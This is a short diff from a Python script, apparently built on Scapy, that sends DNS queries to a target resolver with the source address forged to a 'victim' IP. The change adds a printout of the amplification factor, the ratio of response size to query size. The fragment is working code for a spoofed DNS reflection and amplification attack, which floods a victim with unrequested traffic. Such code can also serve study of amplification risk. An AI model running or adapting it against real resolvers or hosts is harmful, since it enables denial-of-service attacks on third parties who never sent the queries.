@@ -19,8 +19,9 @@ def main(interface, dnsTarget, victim, host):
         
         packet = IP(src=victim, dst=dnsTarget, ttl=time_to_live) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
         try:
-            answer = sr1(packet, iface=interface, timeout=10)
-            print(answer[DNS].summary())
+            query = sr1(packet, iface=interface, timeout=10)
+            print(query[DNS].summary())
+            print('amplification_factor %f' % (len(query)/len(packet)))
         except TypeError:
             print("time out")
 
